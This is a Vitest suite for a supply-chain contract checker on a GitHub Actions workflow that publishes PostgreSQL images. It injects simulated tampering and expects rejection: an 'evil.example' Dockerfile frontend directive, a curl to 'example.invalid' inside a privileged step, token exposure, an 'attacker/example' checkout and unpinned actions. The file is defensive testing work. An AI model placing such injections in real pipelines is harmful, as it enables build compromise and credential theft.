/// <reference types="node" />

import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { parse, stringify } from 'yaml';

import {
  containsDockerfileSyntaxDirective,
  createPostgresImagePublisherFailures,
} from './lib/postgres-image-publisher-contract';

const REPOSITORY_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const PUBLISHER_PATH = resolve(REPOSITORY_ROOT, '.github/workflows/postgres-image-publisher.yml');
const CONTRACT_WORKFLOW_PATH = resolve(REPOSITORY_ROOT, '.github/workflows/postgres-image-publisher-contract.yml');
const publisherWorkflow = readFileSync(PUBLISHER_PATH, 'utf8');
const contractWorkflow = readFileSync(CONTRACT_WORKFLOW_PATH, 'utf8');

function failuresFor(candidatePublisher = publisherWorkflow, candidateContractWorkflow = contractWorkflow): string {
  return createPostgresImagePublisherFailures({
    publisherWorkflow: candidatePublisher,
    contractWorkflow: candidateContractWorkflow,
  }).join('\n');
}

function replaceRequired(source: string, expected: string, replacement: string): string {
  expect(source).toContain(expected);
  return source.replace(expected, replacement);
}

type MutableRecord = Record<string, unknown>;

function requireRecord(value: unknown, label: string): MutableRecord {
  if (typeof value !== 'object' || value === null || Array.isArray(value)) {
    throw new Error(`Cannot structurally mutate ${label}: expected a YAML mapping`);
  }
  return value as MutableRecord;
}

function mutateWorkflowJob(source: string, jobName: string, mutate: (job: MutableRecord) => void): string {
  const workflow = requireRecord(parse(source) as unknown, 'workflow root');
  const jobs = requireRecord(workflow.jobs, 'workflow jobs');
  const job = requireRecord(jobs[jobName], `workflow job ${jobName}`);
  mutate(job);
  return stringify(workflow, { lineWidth: 0 });
}

function requireJobSteps(job: MutableRecord, jobName: string): MutableRecord[] {
  if (!Array.isArray(job.steps) || !job.steps.every((step) => typeof step === 'object' && step !== null)) {
    throw new Error(`Cannot structurally mutate workflow job ${jobName}: expected a steps sequence`);
  }
  return job.steps as MutableRecord[];
}

function requireNamedStep(steps: MutableRecord[], jobName: string, stepName: string): MutableRecord {
  const matches = steps.filter((step) => step.name === stepName);
  if (matches.length !== 1) {
    throw new Error(`Cannot structurally mutate workflow job ${jobName}: expected exactly one ${stepName} step`);
  }
  return matches[0];
}

function mutateWorkflowStep(
  source: string,
  jobName: string,
  stepName: string,
  mutate: (step: MutableRecord) => void,
): string {
  return mutateWorkflowJob(source, jobName, (job) => {
    mutate(requireNamedStep(requireJobSteps(job, jobName), jobName, stepName));
  });
}

function moveWorkflowStepsBefore(
  source: string,
  jobName: string,
  movedStepNames: string[],
  beforeStepName: string,
): string {
  return mutateWorkflowJob(source, jobName, (job) => {
    const steps = requireJobSteps(job, jobName);
    const movedSteps = movedStepNames.map((stepName) => requireNamedStep(steps, jobName, stepName));
    const movedStepNameSet = new Set(movedStepNames);
    const remainingSteps = steps.filter((step) => !movedStepNameSet.has(String(step.name)));
    const beforeIndex = remainingSteps.findIndex((step) => step.name === beforeStepName);
    if (beforeIndex < 0) {
      throw new Error(`Cannot structurally mutate workflow job ${jobName}: missing ${beforeStepName} step`);
    }
    remainingSteps.splice(beforeIndex, 0, ...movedSteps);
    job.steps = remainingSteps;
  });
}

function removeWorkflowNeed(source: string, jobName: string, removedNeed: string): string {
  return mutateWorkflowJob(source, jobName, (job) => {
    if (!Array.isArray(job.needs) || !job.needs.every((need) => typeof need === 'string')) {
      throw new Error(`Cannot structurally mutate workflow job ${jobName}: expected a string needs sequence`);
    }
    const matchingNeeds = job.needs.filter((need) => need === removedNeed);
    if (matchingNeeds.length !== 1) {
      throw new Error(`Cannot structurally mutate workflow job ${jobName}: expected exactly one ${removedNeed} need`);
    }
    job.needs = job.needs.filter((need) => need !== removedNeed);
  });
}

describe('trusted PostgreSQL image publisher contract', () => {
  it('keeps the checked-in publisher inside the parsed trust boundary', () => {
    expect(failuresFor()).toBe('');
  });

  it.each([
    '# syntax=docker/dockerfile:1',
    '   #   syntax = docker/dockerfile:1',
    '\t#\tsYnTaX\t=docker/dockerfile:labs',
    '\uFEFF# syntax=evil.example/frontend:latest',
    '\uFEFF \t#  SYNTAX = evil.example/frontend@sha256:abc',
    'FROM postgres:18\n  # syntax=evil.example/frontend:latest',
    'FROM postgres:18\r\n\t# syntax = evil.example/frontend:windows\r\nRUN true\r\n',
  ])('recognizes whitespace- and BOM-prefixed Dockerfile frontend directive %j', (dockerfile) => {
    expect(containsDockerfileSyntaxDirective(dockerfile)).toBe(true);
  });

  it.each(['FROM postgres:18', '# ordinary comment\nFROM postgres:18', '\uFEFFFROM postgres:18'])(
    'does not confuse ordinary Dockerfile text with a frontend directive %j',
    (dockerfile) => {
      expect(containsDockerfileSyntaxDirective(dockerfile)).toBe(false);
    },
  );

  it.each([
    {
      name: 'automatic trigger',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '  workflow_dispatch:\n', '  workflow_dispatch:\n  push:\n    branches: [main]\n'),
      expected: /only the manual workflow_dispatch trigger/,
    },
    {
      name: 'workflow-level fallback shell defaults',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '  cancel-in-progress: false\n\nenv:',
          '  cancel-in-progress: false\n\ndefaults:\n  run:\n    shell: bash\n\nenv:',
        ),
      expected: /top-level keys must match.*no defaults|must not define workflow-level defaults/,
    },
    {
      name: 'second source input',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '        required: true\n        type: string\n\nconcurrency:',
          '        required: true\n        type: string\n      source_ref:\n        required: true\n        type: string\n\nconcurrency:',
        ),
      expected: /accept only expected_main_sha/,
    },
    {
      name: 'abbreviated SHA acceptance',
      mutate: (workflow: string) => replaceRequired(workflow, '^[0-9a-f]{40}$', '^[0-9a-f]{7,40}$'),
      expected: /lowercase full expected_main_sha/,
    },
    {
      name: 'github SHA equality removed',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '[[ "$EXPECTED_MAIN_SHA" == "$DISPATCH_SHA" ]]', '[[ -n "$DISPATCH_SHA" ]]'),
      expected: /must equal github.sha/,
    },
    {
      name: 'workflow SHA equality removed',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '[[ "$EXPECTED_MAIN_SHA" == "$WORKFLOW_SHA" ]]', '[[ -n "$WORKFLOW_SHA" ]]'),
      expected: /must equal github.workflow_sha/,
    },
    {
      name: 'workflow ref binding removed',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '[[ "$WORKFLOW_REF" == "$EXPECTED_WORKFLOW_REF" ]]', '[[ -n "$WORKFLOW_REF" ]]'),
      expected: /exact main workflow path and ref/,
    },
    {
      name: 'unprotected main accepted',
      mutate: (workflow: string) => replaceRequired(workflow, `[[ "$REF_IS_PROTECTED" == 'true' ]]`, 'true'),
      expected: /require protected main/,
    },
    {
      name: 'publisher concurrency cancellation',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '  cancel-in-progress: false', '  cancel-in-progress: true'),
      expected: /serialize every run/,
    },
    {
      name: 'wrong publisher environment',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '    environment: postgres-image-publisher', '    environment: Production'),
      expected: /environment authority is not allowed/,
    },
    {
      name: 'administrator bypass accepted',
      mutate: (workflow: string) => replaceRequired(workflow, '.can_admins_bypass == false', 'true'),
      expected: /disable administrator bypass/,
    },
    {
      name: 'self-review accepted',
      mutate: (workflow: string) => replaceRequired(workflow, '(.prevent_self_review | type == "boolean")', 'true'),
      expected: /must assert an explicit self-review policy/,
    },
    {
      name: 'reviewer-free environment accepted',
      mutate: (workflow: string) => replaceRequired(workflow, '((.reviewers // []) | length > 0)', 'true'),
      expected: /require a reviewer/,
    },
    {
      name: 'multiple deployment branches accepted',
      mutate: (workflow: string) => replaceRequired(workflow, '.total_count == 1', '.total_count > 0'),
      expected: /exactly one branch policy/,
    },
    {
      name: 'persisted checkout credentials',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '          persist-credentials: false', '          persist-credentials: true'),
      expected: /disable persisted credentials/,
    },
    {
      name: 'checkout of an arbitrary ref',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '          ref: ${{ inputs.expected_main_sha }}', '          ref: ${{ github.ref }}'),
      expected: /checkout must use only expected_main_sha/,
    },
    {
      name: 'missing early PostgreSQL 18 contract prerequisite',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          `grep -Fq "'test:postgres18-contract': {" source/vite.config.ts`,
          `grep -Fq "'different-target': {" source/vite.config.ts`,
        ),
      expected: /must fail early when the PostgreSQL 18 contract target is unavailable/,
    },
    {
      name: 'validate-main timeout widened',
      mutate: (workflow: string) =>
        mutateWorkflowJob(workflow, 'validate-main', (job) => {
          if (job['timeout-minutes'] !== 30) throw new Error('validate-main must start with a 30-minute timeout');
          job['timeout-minutes'] = 90;
        }),
      expected: /validate-main timeout must remain 30 minutes/,
    },
    {
      name: 'extra privileged publish step',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '      - name: Publish exact prevalidated OCI layouts\n',
          '      - name: Run injected helper\n        run: source/scripts/publish.sh\n\n      - name: Publish exact prevalidated OCI layouts\n',
        ),
      expected: /publish-images must contain exactly its reviewed step allowlist/,
    },
    {
      name: 'command appended inside an allowed privileged step',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          "            fail 'main moved before OIDC attestation'",
          "            fail 'main moved before OIDC attestation'\n          curl --fail https://example.invalid/injected",
        ),
      expected: /privileged run step .* must match its exact reviewed body/,
    },
    {
      name: 'environment injected into an allowed privileged action',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3\n        with:',
          '        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3\n        env:\n          GH_TOKEN: ${{ github.token }}\n        with:',
        ),
      expected: /privileged parsed job must match its exact reviewed structure/,
    },
    {
      name: 'package write on the recorder',
      mutate: (workflow: string) =>
        mutateWorkflowJob(workflow, 'record-published-digests', (job) => {
          const permissions = requireRecord(job.permissions, 'record-published-digests permissions');
          permissions.packages = 'write';
        }),
      expected: /record-published-digests permissions must match/,
    },
    {
      name: 'OIDC on the build job',
      mutate: (workflow: string) =>
        mutateWorkflowJob(workflow, 'publish-images', (job) => {
          const permissions = requireRecord(job.permissions, 'publish-images permissions');
          permissions['id-token'] = 'write';
        }),
      expected: /publish-images permissions must match/,
    },
    {
      name: 'mutable BuildKit daemon',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          'moby/buildkit:v0.32.2@sha256:28a898719c18a33f4e8000685287fa36fd0dd9560c6440227d3a732d79bb41d8',
          'moby/buildkit:buildx-stable-1',
        ),
      expected: /digest-pinned BuildKit daemon/,
    },
    {
      name: 'mutable QEMU helper',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          'tonistiigi/binfmt:qemu-v10.2.3-68@sha256:400a4873b838d1b89194d982c45e5fb3cda4593fbfd7e08a02e76b03b21166f0',
          'tonistiigi/binfmt:latest',
        ),
      expected: /digest-pinned ARM64 helper/,
    },
    {
      name: 'ARM64 removed from portable smoke matrix',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '        platform: [linux/amd64, linux/arm64]', '        platform: [linux/amd64]'),
      expected: /portable smoke matrix must contain exactly linux\/amd64 and linux\/arm64/,
    },
    {
      name: 'portable dependencies installed while registry credentials remain',
      mutate: (workflow: string) =>
        moveWorkflowStepsBefore(
          workflow,
          'smoke-portable',
          ['Set up Vite+', 'Install locked dependencies after registry credential removal'],
          'Remove registry credentials before image smoke',
        ),
      expected: /smoke-portable tool and dependency setup must occur only after registry credentials are removed/,
    },
    {
      name: 'portable Vite+ setup runs while registry credentials remain',
      mutate: (workflow: string) =>
        moveWorkflowStepsBefore(
          workflow,
          'smoke-portable',
          ['Set up Vite+'],
          'Remove registry credentials before image smoke',
        ),
      expected: /smoke-portable tool and dependency setup must occur only after registry credentials are removed/,
    },
    {
      name: 'seeded smoke dependencies installed without the lockfile',
      mutate: (workflow: string) =>
        mutateWorkflowStep(
          workflow,
          'smoke-seeded',
          'Install locked dependencies after registry credential removal',
          (step) => {
            if (step.run !== 'vp install --frozen-lockfile') throw new Error('seeded smoke install must be frozen');
            step.run = 'vp install';
          },
        ),
      expected: /smoke-seeded must install only the reviewed lockfile graph/,
    },
    {
      name: 'unpinned portable smoke Vite+ setup',
      mutate: (workflow: string) =>
        mutateWorkflowStep(workflow, 'smoke-portable', 'Set up Vite+', (step) => {
          if (step.uses !== 'voidzero-dev/setup-vp@250f29ce396baf5e8f24498e17c0dfdebabc26eb') {
            throw new Error('portable smoke Vite+ setup must start at its reviewed pin');
          }
          step.uses = 'voidzero-dev/setup-vp@v1';
        }),
      expected: /must use only voidzero-dev\/setup-vp@250f29ce396baf5e8f24498e17c0dfdebabc26eb/,
    },
    {
      name: 'unpinned ORAS action',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          'oras-project/setup-oras@1d808f7d7f6995cc68b7bf507bfe5c5446e1dc9d',
          'oras-project/setup-oras@v2',
        ),
      expected: /must use only oras-project\/setup-oras@/,
    },
    {
      name: 'unverified ORAS binary',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          'checksum: 9ce999f8d2de03fc03968b29d743077a58783e545e5eaa53917ca177352d0e59',
          'checksum: 0ce999f8d2de03fc03968b29d743077a58783e545e5eaa53917ca177352d0e59',
        ),
      expected: /checksum-pinned ORAS/,
    },
    {
      name: 'BuildKit GitHub token exposure',
      mutate: (workflow: string) =>
        replaceRequired(workflow, "          github-token: ''", '          github-token: ${{ github.token }}'),
      expected: /never push, attest, emit an SBOM, or receive a GitHub token/,
    },
    {
      name: 'registry push during build',
      mutate: (workflow: string) => replaceRequired(workflow, '          push: false', '          push: true'),
      expected: /offline build must pull but never push/,
    },
    {
      name: 'Dockerfile frontend build argument injected',
      mutate: (workflow: string) =>
        mutateWorkflowStep(
          workflow,
          'publish-images',
          'Build portable OCI layout without registry credentials',
          (step) => {
            const withInputs = requireRecord(step.with, 'portable build inputs');
            withInputs['build-args'] = 'BUILDKIT_SYNTAX=docker/dockerfile:latest\n';
          },
        ),
      expected: /bundled frontend without a build-argument override/,
    },
    {
      name: 'Dockerfile frontend directive revalidation removed',
      mutate: (workflow: string) =>
        mutateWorkflowStep(workflow, 'publish-images', 'Revalidate offline build inputs', (step) => {
          if (typeof step.run !== 'string')
            throw new Error('offline input revalidation must contain an inline run body');
          step.run = replaceRequired(
            step.run,
            '$found ||= /^[ \\t]*#[ \\t]*syntax[ \\t]*=/i;',
            '$found ||= /^never-a-dockerfile-directive$/;',
          );
        }),
      expected: /revalidation must reject whitespace-prefixed syntax directives/,
    },
    {
      name: 'wrong seeded build context',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '          context: ./source\n', '          context: ./source/packages/db\n'),
      expected: /seeded build context and Dockerfile/,
    },
    {
      name: 'retired digest validation after login',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '      - name: Validate offline layouts and retired digest policy',
          '      - name: Validate layouts after registry login',
        ),
      expected: /publish-images step 10 must be Validate offline layouts and retired digest policy/,
    },
    {
      name: 'missing or blank retired-digest configuration accepted before build',
      mutate: (workflow: string) => replaceRequired(workflow, '[[ "$RETIRED_DIGESTS" =~ [^[:space:]] ]] ||', 'true ||'),
      expected: /retired digest configuration must reject missing or blank values before build setup/,
    },
    {
      name: 'explicit none sentinel no longer recognized',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '[[ "$RETIRED_DIGESTS" == \'none\' ]] && exit 0',
          '[[ -z "$RETIRED_DIGESTS" ]] && exit 0',
        ),
      expected: /retired digest configuration must require the explicit none sentinel/,
    },
    {
      name: 'retired digest format accepted loosely',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '[[ "$retired_digest" =~ ^sha256:[0-9a-f]{64}$ ]]',
          '[[ "$retired_digest" =~ ^sha256:.*$ ]]',
        ),
      expected: /retired digest policy must reject malformed entries/,
    },
    {
      name: 'candidate helper after login',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          oras cp --from-oci-layout \\\n',
          '          vp run source/scripts/publish-helper\n          oras cp --from-oci-layout \\\n',
        ),
      expected: /must not run checked-out helpers/,
    },
    {
      name: 'branch lookup tag',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '"$PORTABLE_IMAGE:$SHA_TAG"', '"$PORTABLE_IMAGE:branch-main"'),
      expected: /publish exact prevalidated OCI layouts|obsolete PR, branch-ref, compare, or branch-tag/,
    },
    {
      name: 'latest discovery tag',
      mutate: (workflow: string) => replaceRequired(workflow, '"$PORTABLE_IMAGE:$SHA_TAG"', '"$PORTABLE_IMAGE:latest"'),
      expected: /must not publish mutable discovery tags/,
    },
    {
      name: 'custom user-authored provenance predicate',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          push-to-registry: false\n',
          '          predicate-type: https://slsa.dev/provenance/v1\n          predicate: "{}"\n          push-to-registry: false\n',
        ),
      expected: /native source-aware provenance/,
    },
    {
      name: 'attestation from an unreviewed source ref',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '              --source-ref "$MAIN_REF" \\\n',
          '              --source-ref refs/pull/1/head \\\n',
        ),
      expected: /pin refs\/heads\/main/,
    },
    {
      name: 'missing attestation signer digest',
      mutate: (workflow: string) =>
        replaceRequired(workflow, '              --signer-digest "$EXPECTED_MAIN_SHA" \\\n', ''),
      expected: /pin the signer SHA/,
    },
    {
      name: 'unvalidated attestation URL',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          "          attestation_url_pattern='^https://github\\.com/boardsesh/boardsesh/attestations/[0-9]+$'",
          "          attestation_url_pattern='.*'",
        ),
      expected: /attestation URLs must match/,
    },
    {
      name: 'digest artifact before attestation verification',
      mutate: (workflow: string) => removeWorkflowNeed(workflow, 'record-published-digests', 'verify-attestations'),
      expected: /record-published-digests dependencies must match/,
    },
    {
      name: 'digest artifact without direct current-main authorization dependency',
      mutate: (workflow: string) => removeWorkflowNeed(workflow, 'record-published-digests', 'authorize-current-main'),
      expected: /record-published-digests dependencies must match/,
    },
    {
      name: 'final artifact upload without github SHA recheck',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          [[ "$EXPECTED_MAIN_SHA" == "$GITHUB_SHA" ]] ||\n            fail \'expected_main_sha no longer equals github.sha\'\n          [[ "$EXPECTED_MAIN_SHA" == "$WORKFLOW_SHA" ]] ||',
          '          [[ -n "$GITHUB_SHA" ]] ||\n            fail \'expected_main_sha no longer equals github.sha\'\n          [[ "$EXPECTED_MAIN_SHA" == "$WORKFLOW_SHA" ]] ||',
        ),
      expected: /artifact upload must recheck expected_main_sha against github.sha/,
    },
    {
      name: 'final artifact upload without workflow SHA recheck',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          [[ "$EXPECTED_MAIN_SHA" == "$WORKFLOW_SHA" ]] ||\n            fail \'workflow source SHA no longer equals expected_main_sha\'',
          '          [[ -n "$WORKFLOW_SHA" ]] ||\n            fail \'workflow source SHA no longer equals expected_main_sha\'',
        ),
      expected: /artifact upload must recheck the workflow source SHA/,
    },
    {
      name: 'final artifact upload without protected-main workflow ref recheck',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          [[ "$WORKFLOW_REF" == "$EXPECTED_WORKFLOW_REF" ]] ||\n            fail \'workflow definition is no longer bound to its approved main path\'',
          '          [[ -n "$WORKFLOW_REF" ]] ||\n            fail \'workflow definition is no longer bound to its approved main path\'',
        ),
      expected: /artifact upload must recheck the exact protected-main workflow ref/,
    },
    {
      name: 'final artifact upload without live main recheck',
      mutate: (workflow: string) =>
        replaceRequired(
          workflow,
          '          [[ "$(gh api "/repos/$APPROVED_REPOSITORY/git/ref/heads/$DEFAULT_BRANCH" --jq \'.object.sha\')" == "$EXPECTED_MAIN_SHA" ]] ||\n            fail \'main moved before digest artifact upload\'',
          '          [[ "$EXPECTED_MAIN_SHA" == "$EXPECTED_MAIN_SHA" ]] ||\n            fail \'main moved before digest artifact upload\'',
        ),
      expected: /artifact upload must recheck the live main head immediately before upload/,
    },
    {
      name: 'tag claimed as immutable identity',
      mutate: (workflow: string) =>
        replaceRequired(workflow, 'deployment_identity: "digest-only"', 'deployment_identity: "tag"'),
      expected: /digests as the sole identity/,
    },
    {
      name: 'unparsed malformed YAML',
      mutate: (workflow: string) => `${workflow}\n  broken: [\n`,
      expected: /not valid YAML/,
    },
  ])('fails closed after $name', ({ mutate, expected }) => {
    expect(failuresFor(mutate(publisherWorkflow))).toMatch(expected);
  });

  it('rejects a privileged contract workflow', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      'permissions:\n  contents: read',
      'permissions:\n  contents: read\n  packages: write',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(/globally contents-read-only|never receive/);
  });

  it('rejects workflow-level defaults in the contract workflow', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      '\npermissions:\n  contents: read',
      '\ndefaults:\n  run:\n    shell: bash\n\npermissions:\n  contents: read',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(/top-level keys must match.*no defaults|must not define/);
  });

  it.each([
    [
      'group',
      'postgres-image-contract-${{ github.event.pull_request.number || github.ref }}',
      'postgres-image-contract-${{ github.ref }}',
    ],
    ['cancellation policy', "${{ github.event_name == 'pull_request' }}", 'true'],
  ])('rejects altered contract workflow concurrency %s', (_label, expected, replacement) => {
    const weakened = replaceRequired(contractWorkflow, expected, replacement);
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /concurrency must cancel only superseded pull-request runs/,
    );
  });

  it.each([
    ['ref', 'main'],
    ['repository', 'attacker/example'],
    ['path', 'source'],
    ['token', 'unreviewed-token'],
  ])('rejects a contract checkout %s override', (inputName, inputValue) => {
    const weakened = replaceRequired(
      contractWorkflow,
      '          persist-credentials: false',
      `          persist-credentials: false\n          ${inputName}: ${inputValue}`,
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(/checkout inputs must be exactly/);
  });

  it('rejects continue-on-error on a contract step', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      '      - name: Verify publisher authority and artifact contracts\n        run:',
      '      - name: Verify publisher authority and artifact contracts\n        continue-on-error: true\n        run:',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /must not continue on error|exact reviewed parsed structure/,
    );
  });

  it('rejects continue-on-error in contract job metadata', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      '    timeout-minutes: 10\n    steps:',
      '    timeout-minutes: 10\n    continue-on-error: true\n    steps:',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(/job metadata must match|failure handling/);
  });

  it('rejects altered pull-request trigger metadata and paths', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      '  pull_request:\n    paths:',
      '  pull_request:\n    branches: [main]\n    paths:',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /exact reviewed pull-request and protected-main path triggers/,
    );
  });

  it('rejects an altered protected-main trigger path', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      "      - 'docs/postgres-image-publishing.md'",
      "      - 'docs/unrelated.md'",
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /exact reviewed pull-request and protected-main path triggers/,
    );
  });

  it.each(['vite.config.ts', 'scripts/vite.config.ts'])(
    'rejects omission of test-discovery trigger %s',
    (configurationPath) => {
      const weakened = replaceRequired(contractWorkflow, `      - '${configurationPath}'\n`, '');
      expect(failuresFor(publisherWorkflow, weakened)).toMatch(
        /exact reviewed pull-request and protected-main path triggers/,
      );
    },
  );

  it('rejects an altered protected-main push branch', () => {
    const weakened = replaceRequired(contractWorkflow, '    branches: [main]', '    branches: [release]');
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /exact reviewed pull-request and protected-main path triggers/,
    );
  });

  it('rejects an injected contract step through its parsed allowlist', () => {
    const weakened = replaceRequired(
      contractWorkflow,
      '      - name: Verify publisher authority and artifact contracts\n',
      '      - name: Publish package\n        run: docker push example.invalid/image\n\n      - name: Verify publisher authority and artifact contracts\n',
    );
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(/exactly its reviewed step allowlist/);
  });

  it('rejects a manually dispatchable contract workflow', () => {
    const weakened = replaceRequired(contractWorkflow, '  pull_request:\n', '  workflow_dispatch:\n');
    expect(failuresFor(publisherWorkflow, weakened)).toMatch(
      /run only for pull requests and pushes|never receive dispatch/,
    );
  });
});
